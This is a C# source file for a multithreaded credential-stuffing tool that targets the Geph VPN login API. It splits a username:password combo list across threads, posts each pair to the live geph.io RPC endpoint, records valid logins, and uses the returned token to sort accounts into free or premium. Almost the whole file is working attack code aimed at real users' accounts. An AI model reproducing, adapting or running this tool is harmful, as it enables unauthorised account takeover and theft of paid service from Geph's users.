// MultiThreaded geph.io Brute Forcer

using Gephwin;
using System.Text.RegularExpressions;

namespace ThreadExample
{
    public class backend
    {
        
        public volatile bool pauseThreads = false;
        private Form1 _form;
        
        //a simple dependancy injection , instantiating the ui object
        public backend(Form1 form)
        {
            _form = form;
        }
        private static int count = 0;
        public static int flag = 1;
        
        // main algorithm for multithreading
        // probably the hardest part of the app , this is where threads are
        // created and maintained
        public void Main(string[] combo, int bot)
        {
            int lines = combo.Length / bot;
            for (int i = 0; i < bot; i++)
            {
                int start = i * lines;
                int end = (i == bot - 1) ? combo.Length : (i + 1) * lines;
                
                Thread thread = new Thread(() => check(combo, start, end, i + 1));
                thread.Start();
            }
        }
        
        // logic of each thread
        // when each thread is created , the start and end line are assigned 
        // and the thread will keep running untill it has checked the required 
        // amount of accounts
        public async void check(string[] combo, int start, int end, int threadNumber)
        {
            
            HttpClient client = new HttpClient();
            for (int i = start; i < end; i++)
            {
                // pause the thread 
                while (pauseThreads)
                {
                    Thread.Sleep(1000);
                }
                count++;
                
                // split each line based on : , so we can save the username and password from each line
                string[] parts = combo[i].Split(":");
                string username = parts[0];
                string password = parts[1];
                
                // creating the payload and doing the post request to geph api
                string param = string.Format("{{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"login\",\"params\":[\"{0}\",\"{1}\"]}}", username, password);
                var content = new StringContent(param, System.Text.Encoding.UTF8, "application/json");
                var response = await client.PostAsync("https://web-backend.geph.io/rpc", content);
                string info = await response.Content.ReadAsStringAsync();
                
                // pattern matching with regex to get the token 
                // with token we can check if accounts are free or premium
                // the regex logic was generated using https://regex-generator.olafneumann.org/
                string pattern = "^\\{\"jsonrpc\":\"2\\.0\",\"result\":\"([0-9]+([A-Za-z]+[0-9]+)+)\",\"id\":1\\}$";
                var regex = new Regex(pattern, RegexOptions.IgnoreCase);
                var match = regex.Match(info);
                string res = match.Groups[1].Value;
                
                // if the response contains -1 , this is a bad account and we update the ui
                if (info.Contains("-1"))
                {
                    _form.updatecbad(1);
                }
                // if the response doesnt contain -1 , this is a valid account
                // in order to check the subscription , we send a new request based on the
                // given jsonrpc , which allows us to check the subscription and update the ui based on the result. 
                else
                {
                    _form.updatechit(1, username, password, "");
                    string post = string.Format("{{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"user_info\",\"params\":[\"{0}\"]}}", res);
                    
                    var checkcontent = new StringContent(post, System.Text.Encoding.UTF8, "application/json");
                    var checking = await client.PostAsync("https://web-backend.geph.io/rpc", checkcontent);
                    var checkresult = await checking.Content.ReadAsStringAsync();
                    
                    // if response contains free , this is a free account and we update the ui
                    if (checkresult.Contains("free"))
                    {
                        _form.updatecfree(1);
                    }
                    
                }
            
            }
        
        }
    
    }

}
